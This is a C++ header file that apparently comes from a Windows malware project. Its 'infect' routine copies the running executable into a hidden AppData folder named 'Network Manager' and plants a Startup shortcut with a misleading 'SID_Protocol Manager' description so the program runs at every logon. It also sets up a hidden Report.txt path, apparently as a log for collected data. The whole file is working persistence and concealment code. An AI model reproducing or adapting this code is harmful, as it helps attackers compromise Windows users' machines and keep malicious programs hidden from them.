#ifndef ROOT_H
#define ROOT_H

//Set.h

/*****************************************include**********************************************/
#include "windows.h"
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include "Objbase.h"
#include <Shlwapi.h>
#include <Iphlpapi.h>

#include "Buffer.h"

using namespace std;

/************************************** Declarations ******************************************/

	struct 									lSet //infect
		{
			private:
				string						CandyPath;
				string						ShortcutPath;
				string						PopPath;			
									 
			public:

				int 						Check();
				
				string						GetPath();

				BOOL 						WorkingDir();

				BOOL 						CheckFileExists(const string &f);			
				
				int 						infect();								
		}
		lset;
		lSet *set = &lset;

/************************************** Definitions ********************************************/

	BOOL 									lSet::Check()
		{
			buffer -> BufferPath.clear();
			buffer -> BufferPath.append(GetPath()); 
			buffer -> BufferPath.append("\\Network Manager\\Report.txt");

			ShortcutPath.clear();
			ShortcutPath.append( GetPath());
			ShortcutPath.append("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Network Manager.lnk");
		    
			bool ShortcutExist = CheckFileExists(ShortcutPath.c_str());
			
			return ShortcutExist;
		}

//- - - - - - - 	 - - - - - - -  		- - - - - - - - - - 	- - - - - - - - -
		
	int 									lSet::infect()
		{
			CandyPath.clear();
			CandyPath.append(GetPath()); 
			CandyPath.append("\\Network Manager\\SID_ShellLink.exe");

		    //Get actual path
		    char ActualPath[MAX_PATH];
		    HMODULE GetModH = GetModuleHandle(NULL);
		    GetModuleFileName(GetModH,ActualPath,sizeof(ActualPath));  
		    CopyFile(ActualPath, CandyPath.c_str(), false);


		    //Add to start
		   	 CoInitialize(NULL);    	  
		   	 IShellLink* pShellLink = NULL;    	   
		  	 HRESULT hres;	    
		 	 hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL,IID_IShellLink,
		              										  (void**)&pShellLink);
		      
		    if (SUCCEEDED(hres))
		    {
		        pShellLink -> SetPath( CandyPath.c_str() );
		        pShellLink -> SetDescription( "SID_Protocol Manager" );
		        pShellLink -> SetIconLocation( CandyPath.c_str() , 0 );
		    
		        IPersistFile *pPersistFile;

		        hres = pShellLink -> QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
		        
		        if (SUCCEEDED(hres))
		        {
		            hres = pPersistFile -> Save( L"Network Manager.lnk" , TRUE);		        
		            pPersistFile -> Release();

		            MoveFile( "Network Manager.lnk" , ShortcutPath.c_str());

		        }
		        else
		        {
		            return 2;
		        }
		        pShellLink -> Release();
		    }
		    else
		    {		        
		        return 1;
		    }
		    
		    return 0;    
		} 	
		

	BOOL 									lSet::WorkingDir()
		{
			PopPath.clear();
			PopPath.append(GetPath());
			PopPath.append("\\Network Manager");

			if(CreateDirectory(PopPath.c_str() ,NULL))
			    {
			        SetFileAttributes(PopPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
			        return true;
			    }
			else
				{
					return false;
				}
		}

	BOOL 									lSet::CheckFileExists(const string &f)
	    {
	        ifstream file(f);
	        return (bool)file; 
	    }	

	string 									lSet::GetPath()
	    {
	        string appdata_dir(getenv("APPDATA"));
	        string full = appdata_dir;

	        return full;
	    }

	

#endif
